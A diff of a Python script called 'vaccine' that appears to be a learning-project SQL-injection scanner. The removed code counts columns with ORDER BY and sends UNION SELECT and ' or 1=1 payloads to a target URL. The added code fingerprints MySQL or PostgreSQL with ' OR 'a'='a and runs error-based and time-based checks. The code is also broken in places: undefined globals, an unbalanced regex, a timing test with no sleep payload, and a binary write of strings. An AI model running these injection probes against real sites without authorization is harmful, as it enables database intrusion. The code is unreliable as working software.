@@ -1,109 +1,86 @@
 #!/usr/bin/python3
 
-import argparse, requests, re, os, sys, difflib
+import argparse, requests, re, os, sys, difflib, time
 
 
-def form_url(url, add):
-    if add == "#":
-        return url
-    if add.startswith('/'):
-        if url.endswith('/'):
-            url = url[:-1]
-        return url + add
-    baseurl_match = re.search(r'^(https?://[^/]+', url)
-    if not baseurl_match:
-        print(f"url {url} is wrong")
-        sys.exit(1)
-    baseurl = baseurl_match.group()
-    return baseurl + '/' + add
-
-
-def get_diff(str1, str2):
-    diff = difflib.unified_diff(str1.splitlines(), str2.splitlines(), n=0)
-    ret = ""
-    cnt = 0
-    for d in diff:
-        cnt += 1
-        if cnt < 4 or d.startswith("-"):
-            continue
-        ret += d[1:].strip() + '\n'
-    return ret
-
-
-def get_result(str1, str2, query=""):
-    diff = get_diff(str1, str2)
-    result = diff.replace("<b>", "").replace("</b>", "").replace('<(.|\n)*?>', '\n').replace('\n+', '\n')
-    if query:
-        result = result.replace(query, "[query]")
-    return result
-
-
-def submit(query, delimiter="#"):
-    original_text = requests.get(url).text
-    normal_text = requests.get(url, params={delimiter: "' or 1=1" + delimiter}).text
-    return original_text, normal_text
-
-
-def error(original_text, normal_text, delimiter="#"):
-    flag = 0
-    for i in range(1, 12):
-        q = f" ORDER BY {i}"
-        query = delimiter + q + delimiter
-        res = requests.get(url, params=query)
-        result = get_diff(original_text, res.text)
-        if res.text and not result:
-            flag = 1
-            continue
-        result = get_diff(normal_text, res.text)
-        if len(normal_text) == len(res.text):
-            flag = 1
-            continue
-        if not result:
-            continue
-        break
-    column_counts = i - flag
-    if column_counts == 0 or column_counts >= 10:
-        raise Exception("this method does not work")
-    print(f"column counts: {column_counts}")
-    return column_counts
-
-
-def union(original_text, normal_text, column_counts, delimiter="#"):
+def test1(url, db_engine, payload):
     try:
-        union_query = f"{delimiter} UNION SELECT "
-        columns = ", ".join([f"'test_{i}'" for i in range(column_counts)])
-        union_query += columns
-        response = requests.get(url, params={"query": union_query})
-        print(f"Union Query Response: {response.text[:500]}")
+        response = requests.get(url, params={"query": payload})
+        if db_engine == "MySQL" and "MySQL error" in response.text:
+            return True
+        elif db_engine == "PostgreSQL" and "PostgreSQL error" in response.text:
+            return True
+    except requests.exceptions.RequestException:
+        pass
+    return False
 
-    except Exception as e:
-        print(f"Error: {str(e)}")
+
+def test2(url, db_engine, payload):
+    try:
+        start_time = time.time()
+        response = requests.get(url, params={"query": payload})
+        end_time = time.time()
+        if db_engine == "MySQL" and end_time - start_time > 5:
+            return True
+        if db_engine == "PostgreSQL" and end_time - start_time > 5:
+            return True
+    except requests.exceptions.RequestException:
+        pass
+    return False
+
+
+def detect_database(url):
+    payload = "' OR 'a'='a"
+    
+    try:
+        response = requests.get(url, params={"query": payload})
+        mysql_error_pattern = "You have an error in your SQL syntax"
+        postgresql_error_pattern = "ERROR: syntax error at or near"
+        
+        print(response.text)
+
+        if mysql_error_pattern in response.text:
+            return "MySQL"
+        elif postgresql_error_pattern in response.text:
+            return "PostgreSQL"
+        
+    except requests.exceptions.RequestException as e:
+        print(f"Error during database detection: {e}")
+        return None
+
+    return None
 
 
 def vaccine(url, method):
+    db_engine = detect_database(url)
+    if not db_engine:
+        print("Database engine detection failed.")
+        return
+    
     try:
-        original_text, normal_text = submit("#")
-        column_counts = error(original_text, normal_text, "#")
-        union(original_text, normal_text, column_counts, "#")
+        payload = "' UNION SELECT"
+        test1(url, db_engine, payload)
+        test2(url, db_engine, payload)
 
     except Exception as e:
         print(f"Error: {str(e)}")
 
-    try:
-        original_text, normal_text = submit("--")
-        column_counts = error(original_text, normal_text, "--")
-        union(original_text, normal_text, column_counts, "--")
-
-    except Exception as e:
-        print(f"Error: {str(e)}")
 
 
 def validate_args(args):
     if not args.url.startswith(('https://', 'http://')):
         args.url = 'http://' + args.url
+    args.X = args.X.upper()
     if args.X != 'POST' and args.X != 'GET':
         print(f"Request type {args.X} not supported")
         sys.exit(1)
+
+
+def store_results(results, filename):
+    with open(filename, 'wb') as file:
+        for result in results:
+            file.write(result + "\n")
+        print(f"Reults writes in {filename}")
 
 
 def parse_arguments():
